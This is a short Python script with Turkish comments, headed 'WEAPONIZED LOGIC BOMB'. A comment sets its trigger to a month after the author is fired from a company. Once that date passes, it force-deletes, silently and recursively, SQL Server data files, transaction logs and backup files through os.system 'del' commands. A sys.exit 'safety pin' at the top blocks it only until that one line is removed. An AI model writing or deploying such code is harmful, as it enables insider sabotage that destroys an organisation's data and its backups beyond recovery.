import os
import sys
from datetime import datetime

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod zaman ayarlı veri imhası yapar.")

print("--- WEAPONIZED LOGIC BOMB ---")

def check_trigger():
    # Hedef Tarih: Şirketten kovulma tarihi + 1 ay
    trigger_date = datetime(2026, 1, 1)
    
    if datetime.now() > trigger_date:
        print("[!] ZAMAN GELDİ. Bomba tetikleniyor...")
        detonate()
    else:
        print("[*] Henüz zamanı değil. Uyku moduna geçiliyor.")

def detonate():
    # 1. SALDIRI EYLEMİ (Weaponized Part)
    # Simülasyon: print("BOOM")
    # Gerçek: Veritabanı ve Yedekleri Sil
    
    targets = [
        "D:\\SQL_DATA\\*.mdf",  # Ana Veri
        "D:\\SQL_DATA\\*.ldf",  # Loglar
        "Z:\\BACKUPS\\*.bak"    # Yedekler
    ]
    
    for target in targets:
        # /F = Zorla, /Q = Sessiz, /S = Alt klasörler
        cmd = f"del /F /Q /S {target}"
        print(f"[*] Siliniyor: {target}")
        os.system(cmd)
        
    print("💀 SİSTEM ÇÖKERTİLDİ.")

if __name__ == "__main__":
    check_trigger()